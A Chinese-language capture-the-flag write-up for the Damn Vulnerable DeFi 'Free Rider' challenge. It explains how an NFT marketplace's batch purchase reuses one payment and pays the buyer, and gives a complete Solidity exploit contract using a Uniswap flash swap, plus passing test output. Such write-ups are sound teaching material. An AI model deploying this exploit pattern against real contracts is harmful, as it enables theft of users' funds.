## 题目 [Free Rider](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/free-rider)

一个名为 `Damn Valuable NFTs` 的新市场已经发布！目前有 6 个 NFT 被铸造，并在市场上出售。每个 NFT 的售价为15 ETH。  

然而，一个关键漏洞已经被报告，称所有的代币都可能被盗取。开发人员不知道如何保护这些 NFT ！  

他们悬赏 45 ETH，寻找愿意帮助取出这些 NFT 并将其发送给他们的人。整个恢复过程由一个专用的智能合约管理。  

你决定提供帮助，但你只有 0.1 ETH 的余额。尽管如此，开发人员却没有回复你要求更多资金的消息。  

如果你能获得免费的ETH，哪怕只是一瞬间，那该多好。  

## 合约分析
这个 `FreeRiderNFTMarketplace` 合约提供了简单的 NFT 交易功能，卖家可以批量上架 NFT，授权所有 NFT 和批量报价，买家可以批量购买 NFT，把 ether 发给合约，合约再把钱转给卖家。  
问题就出在批量购买中的 `_buyOne` 函数上。
``` solidity
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        unchecked {
            _buyOne(tokenIds[i]);
        }
    }
}

function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {
        revert InsufficientPayment();
    }

    --offersCount;

    // transfer from seller to buyer
    DamnValuableNFT _token = token; // cache for gas savings
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // pay seller using cached token
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```
在单独编写 `_buyOne` 函数中，判断 `msg.value` 需要大于报价看起来没什么问题，但是在批量购买的情况下，用户可以花一份 `msg.value` 的钱购买所有输入的 NFT。  
还有一个问题，在这两行代码中。  
``` solidity
_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```
仔细看，这两行代码写反了，先把卖家的 NFT 所有权转给了买家，于是又把 ether 转给了 NFT 所有者（买家）。  
于是说，我们不仅用一份的钱买到了多个 NFT，并且除了支付了一份的钱，每次多买一次 NFT，还能多赚 15 ether。

## 题解
1. 从闪电贷借出 15 ether。
2. 购买所有的 6 个 NFT。
3. 将 NFT 发送到恢复合约，拿到赏金。
4. 偿还闪电贷，并且支付手续费。

POC:
``` solidity
contract FreeRiderExploiter {
    WETH weth;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;
    address owner;

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;

    constructor(WETH _weth, IUniswapV2Pair _uniswapPair, FreeRiderNFTMarketplace _marketplace, DamnValuableNFT _nft, FreeRiderRecoveryManager _recoveryManager) payable {
        weth = _weth;
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
        owner = msg.sender;
    }

    function attack() public {
        // 1. 从 pair 合约借出 15 weth。
        uniswapPair.swap(NFT_PRICE, 0, address(this), "1");

        payable(owner).transfer(address(this).balance);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        weth.withdraw(weth.balanceOf(address(this)));

        // 2. 购买所有的 6 个 NFT。支付了 15 ether, 但收到了 15 * 6 = 90 ether
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        for (uint i = 0; i < ids.length; ++i) {
            ids[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE}(ids);

        // 3. 将 NFT 发送到恢复合约，拿到赏金。
        for (uint i = 0; i < ids.length; i++) {
            nft.safeTransferFrom(address(this),address(recoveryManager), i, abi.encode(owner));
        }

        // 4. 偿还闪电贷本金(15 ether) + 手续费(0.3%)。
        uint256 amountToPayBack = NFT_PRICE * 10031 / 10000;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(uniswapPair), amountToPayBack);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}

}
```
运行测试：
```
forge test --mp test/free-rider/FreeRider.t.sol -vv
```
测试结果：
```
Ran 2 tests for test/free-rider/FreeRider.t.sol:FreeRiderChallenge
[PASS] test_assertInitialState() (gas: 82197)
[PASS] test_freeRider() (gas: 1030001)
Logs:
  player ETH: afterExploit 120053500000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 5.48ms (2.13ms CPU time)
```




